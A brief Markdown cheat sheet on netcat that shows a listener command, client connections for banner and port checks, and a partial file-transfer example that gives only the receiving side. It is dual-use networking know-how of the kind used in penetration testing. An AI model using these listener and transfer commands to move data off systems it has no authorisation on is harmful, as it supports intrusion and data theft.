# Netcat
Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. More information [Link](https://blog.ikuamike.io/posts/2021/netcat/)

## Server Mode
Use netcat to listen for connections. What this does is open a port (either tcp or udp) on the system. By default netcat listens on tcp.

> Basic Listener
```bash
$ nc -lvnp PORT
```
[-l]: Listen incoming connection
[-v]: Verbose output
[-n]: Do not do DNS
[-p]: Specifies source port nc should use

To listen on UDP must use `-u`.

## Client Mode
Use netcat to connect to an open port on a system. This can be beneficial for manually checking service banners or just checking if the port is open.

> Basic Connection
```bash
$ nc -vn @IP PORT
```

For a UDP connection we only add the `-u` option.

## File Transfer
Transfer files over the connection from one system to another without distortion.
Donâ€™t really care about which is the server and which is the client because the transfer can go either direction but we need to run the listener first.

> Transfer file on Server1 to Server2
```bash
nc 192.168.125.10 8080 > /path/to/outfile 
```
